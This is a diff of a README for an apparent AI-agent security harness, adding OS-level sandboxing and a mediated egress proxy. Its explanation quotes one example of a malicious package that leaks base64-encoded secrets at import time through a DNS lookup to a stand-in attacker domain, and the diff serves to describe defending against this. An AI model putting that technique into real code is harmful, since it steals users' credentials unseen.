@@ -258,12 +258,13 @@ never fail open.
 
 ## <img src=".github/assets/icons/novelty-animated.svg" width="28" align="top" alt=""> What makes it novel
 
-Twelve things you rarely find together. Each is in plain language below - the deeper "how" stays proprietary.
+Thirteen things you rarely find together. Each is in plain language below - the deeper "how" stays proprietary.
 
 | What's novel | What it means for you |
 |:--|:--|
 | 🛡️ **Security *around* a moving target** | The injection defense lives in omp's extensions, so it upgrades with omp - no fork, no merge debt. |
 | 🔒 **A gate that cannot fail open** | If the scanner dies or returns garbage, the gate **blocks** (never "safe"). A test kills it mid-run and the block still holds. |
+| 🧱 **Runtime containment, not just approval** | Even after `bash` is approved, the process runs **OS-isolated** (Linux bwrap · macOS Seatbelt · Windows AppContainer) and its network is **mediated** - a package that phones home over a DNS lookup at import time is **refused and audited**, while `pip install` still works. |
 | 🧬 **Provenance-gated memory** | Suspicious or quarantined content can **never auto-save** into memory. Trust comes from the source, not the caller's word. |
 | 🧊 **A cache-stable prompt** | The safety layers are byte-identical on every request. Untrusted text only ever enters **delimited** and **after** the cache point - faster *and* safer. |
 | 🏛️ **A gov-grade gateway, gated** | [AskSage](https://asksage.ai) is wired in with a lockdown mode, **scanned** personas, and answers grounded on your own datasets, with citations. |
@@ -338,7 +339,7 @@ harness/                  # ALL TypeScript (Bun)
   memory/                   # DuckDB store · promotion gate (keystone #2) · cross-session recall · migrations 0001-0009
   personal/                 # encrypted personalization graph · distiller · CUI isolation · ChatGPT/Claude/Gemini import
   telemetry/                # stable-id event stream → DuckDB (replayable)
-  runs/                     # provenance lineage · sandbox profiles · replay
+  runs/                     # provenance lineage · sandbox profiles · runtime execution boundary (sandbox_exec · egress_proxy) · replay
   export/                   # safe_export: escaped, sanitized-only by default
   prompt/                   # the frozen prefix + delimited untrusted tail (assembler)
   omp/                      # security_extension (the in-process gate) · asksage_extension (provider)
@@ -359,6 +360,7 @@ working memory - lives in the **tail after the cache breakpoint**. Untrusted byt
 | **Scan** | `scanner-sidecar/` (pure Unicode) behind NDJSON | finds zero-width, bidi, tag-block, homoglyph, PUA, `Cf` |
 | **Decide** | `gate.ts` → `scanAndDecide` | any scan failure ⇒ **block / quarantine** (never "safe") |
 | **Gate** | `harness/omp/security_extension.ts` (omp pre-hook) | runs **in-process** on every tool call |
+| **Contain** | `harness/runs/sandbox_exec.ts` (bwrap · Seatbelt · AppContainer) + `egress_proxy.ts` | an approved process runs **runtime-isolated**; subprocess DNS/CONNECT is **mediated + audited** (fail-closed) |
 | **Label** | closed set `trusted · untrusted · suspicious · quarantined` | no other values exist |
 | **Promote** | `promotion_gate.ts` | suspicious/quarantined sources can't enter semantic memory |
 | **Export** | `safe_export.ts` | invisibles escaped to `\u{..}`; raw referenced by `sha256`, never inline |
@@ -372,6 +374,20 @@ run it, and the gate blocks the `bash` call:
 
 The gate that blocks here is the exact one the test suite proves - see [`CLAUDE.md`](CLAUDE.md) for the
 load-bearing invariants (fail-closed, extend-don't-fork, frozen contracts, byte-stable prefix).
+
+**Runtime execution boundary (ADR-0157).** Every control above acts on *text, before a process runs*. But
+once `bash` / `pip` / `python` is approved and executing, a malicious dependency can still phone home at
+**import time** - the classic trick is a package whose `__init__.py` does `socket.gethostbyname("<base64-secrets>.attacker.cn")`,
+exfiltrating over a DNS lookup that no argv classifier can catch. LUCID closes that hole *beneath* the gate:
+an approved process is **OS-isolated** (Linux **bubblewrap** · macOS **Seatbelt** · Windows **AppContainer**,
+picked per platform; where none is available LUCID says so out loud and the org can require isolation to
+**fail-closed** instead), and its network is not raw but **mediated** - every subprocess DNS query and CONNECT
+is routed through a loopback proxy and decided by the **same** curated egress policy your browser tools already
+use. So a lookup to a non-whitelisted or foreign-country host is **refused and audited** (a metadata-only
+`egress` event to your SIEM), while `pip install requests` still resolves and works. The whole posture -
+which backend is active, whether egress is mediated, and every reach-out the proxy refused - is visible in the
+Security panel. *(Linux + macOS enforce today; the Windows AppContainer helper is landing. Fail-closed by
+construction: no isolating backend under managed policy ⇒ exec is blocked, never silently un-isolated.)*
 
 **Network whitelist + credential vault (ADR-0106).** Beyond the ad-hoc "always allow this site" the per-site
 egress gate remembers, Settings → **Network Whitelist** lets you curate an allow-list up front: domain patterns
